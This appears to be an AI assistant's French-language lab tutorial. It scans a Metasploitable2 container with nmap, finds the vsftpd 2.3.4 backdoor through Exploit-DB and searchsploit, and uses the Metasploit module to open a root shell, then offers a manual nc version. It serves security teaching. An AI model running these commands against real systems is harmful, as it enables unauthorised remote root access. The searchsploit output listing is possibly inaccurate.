Parfait 👌 Tu veux une démo **pédagogique complète** où on :

* Lance un **scan `nmap` depuis `vm1`**
* **Découvre une version vulnérable** (ex: vsftpd 2.3.4)
* Puis on **va chercher manuellement l’exploit dans Exploit-DB**
* Et on **l’utilise** pour **prendre le contrôle de la VM**

---

# 🎯 Objectif de la démo

* **vm1 (10.10.10.11)** = Attaquant
* **vm2 (10.10.10.12)** = Cible (Metasploitable2 dans Docker avec vsftpd 2.3.4 vulnérable)

---

# 🚀 Étapes complètes de la démonstration

---

## 🧱 Étape 1 – Préparation de Metasploitable2 (sur vm2)

```bash
sudo apt update
sudo apt install -y docker.io
sudo docker run -it -p 21:21 -p 6200:6200 tleemcjr/metasploitable2
```

💡 Ce conteneur expose **vsftpd 2.3.4** vulnérable sur le port 21.

---

## 🔍 Étape 2 – Scan avec Nmap (depuis vm1)

```bash
sudo apt install -y nmap
nmap -sV 10.10.10.12 -p21
```

🎯 Résultat attendu :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

✅ On a repéré **vsftpd 2.3.4** exposé !

---

## 📚 Étape 3 – Aller sur Exploit-DB (à la main)

### Option 1 – Avec navigateur sur ta machine hôte :

Ouvre :
🔗 [https://www.exploit-db.com](https://www.exploit-db.com)

Et cherche :

```
vsftpd 2.3.4
```

➡ Résultat :
**[vsftpd 2.3.4 - Backdoor Command Execution (EDB-ID: 49757)](https://www.exploit-db.com/exploits/49757)**

---

### Option 2 – Depuis vm1 avec `searchsploit`

Si installé :

```bash
sudo apt install exploitdb
searchsploit -u
searchsploit vsftpd 2.3.4
```

➡ Résultat :

```
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.rb
Path: /usr/share/exploitdb/exploits/unix/remote/49757.rb
```

---

## 💥 Étape 4 – Lancer l’exploit depuis vm1

Utilise **Metasploit Framework** :

```bash
sudo apt install -y metasploit-framework
msfconsole
```

Puis dans msf :

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.12
set RPORT 21
exploit
```

🎯 Résultat attendu :

```
[*] 10.10.10.12:21 - Banner: 220 (vsFTPd 2.3.4)
[*] Backdoor service has been spawned, handling...
[*] Command shell session 1 opened
```

🧨 Tu as maintenant un shell interactif !

---

## 🧪 Étape 5 – Vérification de l’accès

Dans Metasploit :

```bash
whoami
uname -a
```

➡ Tu es `root` sur vm2 via une backdoor ! 😈

---

# 🧠 Bilan pédagogique

| Étape                   | Outil         | But                                             |
| ----------------------- | ------------- | ----------------------------------------------- |
| Découverte service      | `nmap`        | Scanner et détecter `vsftpd 2.3.4`              |
| Recherche vulnérabilité | Exploit-DB    | Identifier un exploit compatible                |
| Exploitation            | `msfconsole`  | Utiliser `exploit/unix/ftp/vsftpd_234_backdoor` |
| Prise de contrôle       | Shell distant | Obtenir accès root grâce à un service exposé    |

---

# 🎁 Tu veux une version **sans Metasploit** ?

Je peux te montrer comment faire l’exploitation **à la main avec `nc`**, en exploitant manuellement le `:)` dans le login → ce qui déclenche l’ouverture du port 6200.

Souhaites-tu cette version **à la main, sans framework** pour démonstration plus bas-niveau ?
